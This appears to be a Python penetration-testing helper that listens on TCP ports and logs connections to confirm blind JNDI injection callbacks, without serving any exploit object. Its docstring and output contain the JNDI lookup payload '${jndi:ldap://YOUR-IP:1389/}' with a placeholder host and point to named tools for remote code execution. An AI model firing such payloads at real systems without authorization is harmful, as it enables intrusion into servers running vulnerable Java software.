#!/usr/bin/env python3
"""
callback_listener.py - benign multi-port TCP connection logger (authorized only).

When you can't use interactsh/Collaborator, point your ${jndi:ldap://YOUR-IP:1389/} (or rmi:1099) at this and it
logs the fact that the TARGET JVM CONNECTED BACK - source IP, time, and the first bytes - then closes. It speaks NO
LDAP/RMI and returns NO object, so it can only CONFIRM the callback (blind-RCE proof), never deliver a gadget. For
actual RCE delivery on an authorized engagement, use marshalsec / JNDI-Injection-Exploit (guide §10). (JNDI_TESTING_GUIDE.md §4/§10/§19.)

Usage:
  python3 callback_listener.py --ports 1389,1099,8180
  python3 callback_listener.py --ports 1389 --bind 127.0.0.1 --max-conns 1
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse, socket, threading, time

_LOCK = threading.Lock()
_COUNT = 0
_STOP = threading.Event()


def _log(msg):
    with _LOCK:
        print(msg, flush=True)


def serve_port(port, bind, read_bytes, max_conns):
    global _COUNT
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((bind, port))
        s.listen(16)
        s.settimeout(0.5)
    except Exception as e:
        _log(f"[!] port {port}: cannot bind ({e})")
        return
    _log(f"[i] listening on {bind}:{port}")
    while not _STOP.is_set():
        try:
            conn, addr = s.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        try:
            conn.settimeout(0.5)
            try:
                data = conn.recv(read_bytes)
            except Exception:
                data = b""
            first = data[:read_bytes].hex()
            _log(f"[HIT] port={port} from={addr[0]}:{addr[1]} at={time.strftime('%H:%M:%S')} "
                 f"bytes={len(data)} first={first or '(none)'}   <- target JVM called back (blind-RCE proof)")
        finally:
            try:
                conn.close()
            except Exception:
                pass
        with _LOCK:
            _COUNT += 1
            reached = max_conns and _COUNT >= max_conns
        if reached:
            _STOP.set()
            break
    try:
        s.close()
    except Exception:
        pass


def main():
    ap = argparse.ArgumentParser(description="Benign JNDI callback logger (no gadget served; authorized only).")
    ap.add_argument("--ports", default="1389,1099,8180", help="comma-separated TCP ports to listen on")
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--read-bytes", type=int, default=64, help="how many first bytes to log")
    ap.add_argument("--max-conns", type=int, default=0, help="stop after N total connections (0 = run forever)")
    a = ap.parse_args()

    ports = []
    for x in a.ports.split(","):
        x = x.strip()
        if x.isdigit():
            ports.append(int(x))
    if not ports:
        sys.exit("[!] no valid ports")

    print("== JNDI callback listener (benign: logs the callback, serves NO gadget) ==")
    print(f"[i] point ${{jndi:ldap://<your-ip>:{ports[0]}/}} (or rmi) here; a HIT = the target JVM connected back.")
    threads = [threading.Thread(target=serve_port, args=(p, a.bind, a.read_bytes, a.max_conns), daemon=True)
               for p in ports]
    for t in threads:
        t.start()
    try:
        while not _STOP.is_set() and any(t.is_alive() for t in threads):
            _STOP.wait(0.3)
    except KeyboardInterrupt:
        _STOP.set()
    _STOP.set()
    for t in threads:
        t.join(timeout=1.0)
    print(f"[i] done. {_COUNT} callback(s) logged.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
